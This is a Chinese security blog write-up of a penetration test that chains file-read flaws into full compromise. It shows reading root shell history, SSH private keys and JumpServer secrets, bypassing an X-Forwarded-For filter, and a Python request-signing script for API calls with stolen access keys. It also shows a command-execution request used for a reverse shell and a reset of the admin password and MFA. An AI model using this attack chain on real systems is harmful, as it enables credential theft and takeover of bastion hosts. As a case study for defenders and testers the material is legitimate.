#  文件读取漏洞实战利用   
subjcw  沃克学安全   2025-01-03 03:19  
  
## 申明：文章仅供技术交流，请自觉遵守网络安全相关法律法规，切勿利用文章内的相关技术从事非法活动，如因此产生的一切不良后果与文章作者无关。  
  
本文由subjcw师傅发表在奇安信攻防社区  
  
文章地址：https://forum.butian.net/share/4017  
#   
# Nginx配置文件利用  
  
第一处文件读取，严格来讲是SSRF（CVE-2021-27905），不过java环境下的SSRF利用有限，端口也只开放了443  
  
读取/root/.bash_history  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCPa89EH5qk1JP9yLFP8VEaxbzGbrR7kIzdibvkXMica9y5hCtKJvRNhkmFuNNibJUD4icERw3hUdLAfvQ/640?wx_fmt=png&from=appmsg "")  
  
翻历史命令发现这台主机上有tomcat和nginx，tomcat也没办法利用，于是把目光转向nginx  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCPa89EH5qk1JP9yLFP8VEax64oTyB9Q54ibKB25qPsLmvtFTMoGLo6z0sgBnP5T8cC81HNLyNOt2Jw/640?wx_fmt=png&from=appmsg "")  
  
读取nginx配置文件，获取了多个URL路由信息，分别对应不同的接口或应用  
  
其中有一个管理后台，通过XFF来过滤请求  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCPa89EH5qk1JP9yLFP8VEaxlNaynGFQvJy8Y6FebkLPHqcQlWO8MRQGqrEbHnkayc3FiaUMblbFdlw/640?wx_fmt=png&from=appmsg "")  
  
添加XFF字段，访问到管理后台，弱口令拿下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCPa89EH5qk1JP9yLFP8VEaxlkWUf6VU1WCmG1SRCDPZNAdHgyaHHTt41OP6t5oQdqcnPiazdGVxpcA/640?wx_fmt=png&from=appmsg "")  
# Jumpserver AccessKey利用  
  
第二个依旧是nginx的场景，多个域名解析到同一个IP，根据域名分发到不同的后端服务。  
  
读取/root/.bash_history  
，历史命令比较多，能看出来是经常使用的，还有多个ssh的公私钥  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCPa89EH5qk1JP9yLFP8VEax8jPYe9ASepVANpYdghfPx9UA0Z7o2HicI2ZuZUPyNBG9ibNjlV5mcO0Q/640?wx_fmt=png&from=appmsg "")  
  
拼接路径，拿到SSH公私钥  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCPa89EH5qk1JP9yLFP8VEaxAqmKsbWiaX8fD4Tks0tSCJSRbu9BVjcl1Cf0icRNcA4NdkGAbns91PPg/640?wx_fmt=png&from=appmsg "")  
  
读取/root/.ssh/authorized_keys  
可以发现获取到的公私钥与目标服务器的公钥匹配  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCPa89EH5qk1JP9yLFP8VEaxdwiaB4bIc5yK9oHHgCMG1utw6Pib1384eDcUyxuPDRicFeBoKch9jBrVA/640?wx_fmt=png&from=appmsg "")  
  
尝试SSH直接登陆。多地ping了一下发现不是CDN，对目标的IP全端口扫描，发现SSH开在一个高端口，但是很遗憾登不上。这个SSH是Nginx服务器的，并不是漏洞所在的服务器。  
  
但是刚刚读authorized_keys  
和history  
的时候发现目标服务器部署了jumpserver  
，并且自身在jumpserver  
的管理范围内。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCPa89EH5qk1JP9yLFP8VEaxRPpRQtPl3OEib82DFDGu5jtfkyMrYRL53GsvEuT3t8VsUl2dLI2mJibg/640?wx_fmt=png&from=appmsg "")  
  
  
查看收集到的资产，确实有一个jumpserver相关域名，解析IP与当前目标服务器为同一IP。现在就看能否获取jumpserver  
控制台权限。  
  
读取jumpserver配置文件/opt/jumpserver/config/config.txt  
，可以获取一些敏感信息如数据库、redis密码，但是jumpserver是容器化部署，没办法直接连上。  
  
除此之外就是SECRET_KEY  
和BOOTSTRAP_TOKEN  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCPa89EH5qk1JP9yLFP8VEaxYzicd1GQdtzbFWiaqHqJhqmKQBMImQzb39hibdlXhY8lzfkNYp2F6rYEA/640?wx_fmt=png&from=appmsg "")  
  
  
看一下jumpserver  
官方文档中的说明  
  
参数说明 - JumpServer 文档  
  
（https://docs.jumpserver.org/zh/master/admin-guide/env/）  
```
SECRET_KEY=****           # 用来加密解密的 KEY
BOOTSTRAP_TOKEN=****      # koko/lion 用来向jms注册使用的 token
ACCESS_KEY_FILE=data/keys/.access_key  # ACCESS KEY 保存的地址, 默认注册后会保存到该文件中
```  
  
获取之后可以通过脚本调用接口  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCPa89EH5qk1JP9yLFP8VEaxEjvKh7tE1e6j27nMnlbhhkbKCmIuII25LwZ1xibnq2VBiawhfE4bsOcg/640?wx_fmt=png&from=appmsg "")  
  
jumpserver在jms_core  
容器中提供了命令行工具用于管理员管理用户，可以修改密码、清除MFA，也就是说只要获取jms_core  
容器权限，就可以重置Web管理员密码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCPa89EH5qk1JP9yLFP8VEaxfogx3WiaoJtL7kamqB2Uco2lcIzicsGPvYT2kR3p2c3GwGTiaHvzQLRuQ/640?wx_fmt=png&from=appmsg "")  
  
看一下python示例，通过使用KeyID和SecretID对请求方法、URL、accept、date进行签名。  
```
import requests, datetime, json
from httpsig.requests_auth import HTTPSignatureAuth
def get_auth(KeyID, SecretID):
    signature_headers = ['(request-target)', 'accept', 'date']
    auth = HTTPSignatureAuth(key_id=KeyID, secret=SecretID, algorithm='hmac-sha256', headers=signature_headers)
    return auth
response = requests.get(url, auth=auth, headers=headers)
```  
  
也就是说，只要保持请求方法、URL、accept、date不变，签名是可以重用的，可以简单写个python脚本获取sign，将burp作为上级代理捕获数据包后再手动调试数据包  
```
JMS_URL = '' 
X_JMS_ORG = ''
KEY_ID = ''
SECRET_ID = ''
headers = {
        'Accept': 'application/json',
        'X-JMS-ORG': X_JMS_ORG,
        'Date': datetime.now(timezone.utc).strftime('%a, %d %b %Y %H:%M:%S GMT')
    }
def get_auth():
    signature_headers = ['(request-target)', 'accept', 'date']
    auth = HTTPSignatureAuth(key_id=KEY_ID, secret=SECRET_ID, algorithm='hmac-sha256', headers=signature_headers)
    return auth
def get_request(url):
    auth = get_auth()
    full_url = f"{JMS_URL}{url}"
    print(full_url)
    response = requests.get(full_url, auth=auth, headers=headers, verify=False)
    response = requests.post(full_url, auth=auth, headers=headers, data=None, verify=False)
    print(response.text)
```  
  
读取jumpserver  
的accesskey  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCPa89EH5qk1JP9yLFP8VEaxJSMINz0YHydr07u4gH0ASccWTBwOS0wicWicaicjcjXbbicWAJIhMLAgxw/640?wx_fmt=png&from=appmsg "")  
  
获取主机列表，这里可以读取/etc/hostname  
确认jumpserver  
的主机名，找到对应的主机id  
```
GET /api/v1/assets/assets/?offset\=0&amp;limit\=15&amp;display\=1&amp;draw\=1
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCPa89EH5qk1JP9yLFP8VEaxyHyH9FDqEzvXicHdR7Ce913tvXKmxPWBpq1upypoTia4lcopd2f8IwtQ/640?wx_fmt=png&from=appmsg "")  
  
反弹shell，返回包中包含执行结果的url/api/v1/ops/celery/task//log/  
```
POST /api/v1/ops/command-executions/ HTTP/2
Host: 
User-Agent: python-requests/2.31.0
Accept: application/json
Date: 
Content-Length: 
Content-Type: application/x-www-form-urlencoded
Authorization: Signature
 
hosts=&amp;run_as=&amp;command=
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCPa89EH5qk1JP9yLFP8VEaxQsu9q4mlRyGAIP2xbse1WHWaXAFKZmtZ2ic8zgujBq4gYgfTEuNfN8g/640?wx_fmt=png&from=appmsg "")  
  
根据官方文档重置管理员密码，如果存在OTP同样可以通过manage.py进行重置。如果管理员开启了强制OTP，重置之后可以在登录后重新绑定。  
```
user.mfa_level='0'
user.otp_secret_key=''
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCPa89EH5qk1JP9yLFP8VEaxcvu90xdQClYEJ2D7Ue3H413ltxa9iaCepLv4icfJlBN1NThY0ODSELPA/640?wx_fmt=png&from=appmsg "")  
  
最后以admin  
登录jumpserver  
控制台，接管堡垒机。  
# 小结  
  
文件读取漏洞在攻防场景下的影响比较有限，但是可以利用文件读取获取历史命令、私钥文件、配置文件等进一步攻击其他服务，继而获取权限或者数据。  
  
  
  
如果喜欢小编分享的文章，记得转发+点赞+关注支持一下哦~  
  
现在只对常读和  
星标的公众号才展示大图推送  
  
建议大家把  
公众号“设为星标”，否则可能错过一些好文哦  
  
  
